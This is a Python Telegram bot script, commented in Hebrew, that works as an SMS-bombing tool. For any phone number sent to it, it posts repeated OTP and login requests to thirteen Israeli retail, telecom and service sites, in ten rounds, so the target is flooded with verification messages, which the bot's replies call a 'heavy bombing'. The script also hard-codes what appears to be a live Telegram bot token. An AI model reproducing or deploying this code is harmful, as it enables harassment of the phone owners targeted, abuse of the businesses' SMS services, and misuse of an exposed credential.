import telebot
import requests
import time

# הטוקן שלך
API_TOKEN = '8788411826:AAEQdmRx5OVFB91zjRJrEaMJFghDp8Tayg0'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # רשימה מורחבת של מוקדים ישראלים (SMS/OTP)
    apis = [
        {"u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
        {"u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
        {"u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
        {"u": "https://www.castro.com/api/otp/send", "d": {"phone": target}},
        {"u": "https://api.yellow.co.il/v1/auth/login", "d": {"phone": target}},
        {"u": "https://wolt.com/api/v1/user/check_phone_number", "d": {"phone_number": target}},
        {"u": "https://ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.ivory.co.il/index.php?act=user&sel=otp", "d": {"phone": target}},
        {"u": "https://www.shufersal.co.il/online/he/login/otp/send", "d": {"phone": target}},
        {"u": "https://www.rebar.co.il/api/v1/auth/login", "d": {"phone": target}},
        {"u": "https://www.paz.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.bezeq.co.il/api/v1/otp", "d": {"phone": target}},
        {"u": "https://www.golbary.co.il/api/otp", "d": {"mobile": target}}
    ]
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    for site in apis:
        try:
            # שליחת הבקשה לאתר
            requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
        except:
            pass

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    
    # בדיקה שהמספר תקין
    if target.isdigit() and len(target) >= 10:
        bot.reply_to(m, f"🚀 מתחיל הפצצה כבדה על {target}...")
        
        # 10 סבבים (כלומר כל אתר ישלח בערך 10 הודעות)
        for _ in range(10):
            attack(target)
            time.sleep(1) # המתנה של שנייה בין סבבים למניעת חסימה
            
        bot.send_message(m.chat.id, f"✅ ההפצצה על {target} הסתיימה!")
    else:
        bot.reply_to(m, "שלח לי מספר טלפון תקין (למשל: 0501234567)")

print("--- BOT IS READY AND HEAVY ---")
bot.infinity_polling()
